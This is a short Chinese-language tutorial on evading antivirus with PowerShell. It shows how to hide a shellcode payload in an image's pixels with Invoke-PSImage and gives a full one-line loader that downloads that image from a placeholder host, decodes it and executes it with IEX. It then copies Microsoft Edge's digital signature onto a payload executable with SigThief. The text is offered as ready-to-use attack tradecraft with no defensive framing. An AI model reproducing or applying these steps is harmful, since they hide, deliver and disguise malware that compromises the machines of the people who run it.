Powershell分离免杀

1、将shellcode写入图片

工具：Invoke-PSImage-master

https://github.com/peewpw/Invoke-PSImage

Set-ExecutionPolicy Unrestricted -Scope CurrentUser
//设置执行策略
Import-Module .\Invoke-PSImage.ps1
//导入目标脚本文件
Invoke-PSImage -Script .\payload.ps1 -Image .\img.png -Out .\payload.jpg -Web 
//payload.ps1原生shellcode。img.png是有普通图片。payload.jpg是生成的带有shellcode的图片

sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://example.com/test2.png"));$o=a Byte[] 3600;(0..19)|%{foreach($x in(0..179)){$p=$g.GetPixel($x,$_);$o[$_*180+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3554]))

//生成执行命令，将payload.jpg放入vps，然后将图片地址替换执行命令中的"http://example.com/test2.png"

3、加入数字签名

工具：SigThief-master

https://github.com/secretsquirrel/SigThief

python sigthief.py -i msedge.exe -t payload.exe -o test.exe
// msedge.exe是含有数字签名的程序，payload.exe是需要数字签名程序，test.exe是输出的含有数字签名的程序
